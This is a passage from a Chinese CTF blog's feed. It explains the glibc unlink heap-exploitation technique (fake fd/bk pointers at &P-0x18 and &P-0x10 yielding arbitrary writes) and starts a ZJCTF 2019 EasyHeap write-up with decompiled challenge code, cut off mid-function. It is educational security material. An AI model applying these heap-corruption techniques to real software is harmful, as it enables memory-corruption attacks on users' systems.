punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当 <code>P-&gt;fdnextsize!=null</code>  时才需要修改（这里意味着 P 是 <code>这一组</code> 相同尺寸 chunk 的第一块 chunk），如果  <code>P-&gt;fdnextsize == null</code>  ，说明 P 是尺寸相同的一组 chunks 的非第一个 chunk，此时 P 的  <code>fdnextsize</code>  和 <code>bknextsize</code>  是没有意义的，自然没有修改的必要</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                    </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>                      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>                                </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>                               </pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>                                </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链（P 为 <code>这一组</code> 第一个 chunk）后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。</p>\n<p>接着判断 P-&gt;fd_nextsize == P ，因为当 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk 的话，是需要特别对待的，P 不为第一个时 FD 直接继承 P 的 fdnextsize 以及 bknextsize 即可。</p>\n<p>如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。（这里是每一个组的第一个都是满足这个条件）</p>\n<h1 id=\"4unlink利用\"><a class=\"anchor\" href=\"#4unlink利用\">#</a> 4.Unlink 利用</h1>\n<p>由上面的绕过可以得知:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr></table></figure><p>而在 unlink 宏中：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 在这里 BK=P->bk\t\t\t\t\t      </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t        <span class=\"token comment\">// 在这里 FD=P->fd</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过我们进行的绕过手段导致这里也就相当于：</p>\n<pre><code>FD-&gt;bk = BK  并且  BK=P-&gt;bk\n所以FD-&gt;bk=P-&gt;bk\n\nBK-&gt;fd = FD   并且  FD=P-&gt;fd\n所以BK-&gt;fd =P-&gt;fd\n</code></pre>\n<p>因此这也就是：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span>  <span class=\"token comment\">// 事实上 FD->bk=BK (这里实际上是因为已经在链表中去除 P 后会根据之前 P 的 fd 和 bk 来确定修改后的指针的指向)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>BK<span class=\"token operator\">-></span>fd  <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span>  <span class=\"token comment\">// 事实上 BK->fd=FD</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPOMSN8.png\" alt=\"\" /></p>\n<p>前面构造的为了进行绕过：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x10</span>   <span class=\"token comment\">//P->bk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x18</span>   <span class=\"token comment\">//P->fd</span></pre></td></tr></table></figure><p>这里的执行是有顺序的，所以  <code>BK-&gt;fd = FD</code>  一定是后执行的，所以结果就为： <code>P=&amp;P-0x18</code></p>\n<p>也就是说可以往 P 里写入值去修改 <code>&amp;P-0x18</code>  的内容！(这里是我们往 <code>P</code>  里写值，其会去修改 <code>&amp;P-0x18</code>  地方的值)</p>\n<h2 id=\"p地址的寻找\"><a class=\"anchor\" href=\"#p地址的寻找\">#</a> P 地址的寻找：</h2>\n<p>然而这里还有一个问题是我们如何去找到 P 的地址，这里我们就需要找到堆的管理数组 (一般在 bbs 段处，会有个数组来记录每个 chunk 的地址)，我们可以在这里找到我们伪造的堆块的 <code>数组</code> 的地址，通过这个地址来减 0x18 放入伪造的堆块的 fd 中即可</p>\n<p>这样我们后续改变就可以根据这个数组来修改地址内部的值</p>\n<p>【个人理解】</p>\n<p>我对于 unlink 漏洞的理解是认为他其实是对 对应的堆块的管理数组进行了修改，将我们想要修改的地址作为堆块给添加了上去，其中的一个数组会存放这个想要修改值的地址，这就会导致我们后面可以对其当作堆块一样进行修改</p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVV2NDExajdmci8/cD0yMA==\">https://www.bilibili.com/video/BV1Uv411j7fr/?p=20</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU3ODcy\">https://cloud.tencent.com/developer/article/1557872</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob2xsay5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMDg0ODE4ODk/c3BtPTEwMDEuMjAxNC4zMDAxLjU1MDI=\">https://hollk.blog.csdn.net/article/details/108481889?spm=1001.2014.3001.5502</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsv\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzExNTM4OC5odG1s\">https://www.secpulse.com/archives/115388.html</span></p>\n<p>堆的数据结构：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyOTY1MTg3Lmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/12965187.html</span></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/easyheap/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/easyheap/",
            "title": "ZJCTF 2019EasyHeap（堆溢出，unlink，house of spirit）",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"1分析程序信息\"><a class=\"anchor\" href=\"#1分析程序信息\">#</a> 1. 分析程序信息</h1>\n<p>64 位程序，开启了 nx 和 canary<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJYRg.png\" alt=\"\" /></p>\n<h2 id=\"源代码\"><a class=\"anchor\" href=\"#源代码\">#</a> 源代码：</h2>\n<h3 id=\"main\"><a class=\"anchor\" href=\"#main\">#</a> main：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">delete_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">4869</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>magic <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x1305</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"So sad !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>          <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Congrt !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>          <span class=\"token function\">l33t</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>LABEL_17<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid Choice\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token function\">create_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_17<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>      <span class=\"token function\">edit_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"delete_heap\"><a class=\"anchor\" href=\"#delete_heap\">#</a> delete_heap()：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">delete_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v1 <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No such heap !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"133t后门\"><a class=\"anchor\" href=\"#133t后门\">#</a> 133t（）；【后门】</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">l33t</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /home/pwn/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 有后门</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"create_heap\"><a class=\"anchor\" href=\"#create_heap\">#</a> create_heap()</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">create_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-1Ch]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> 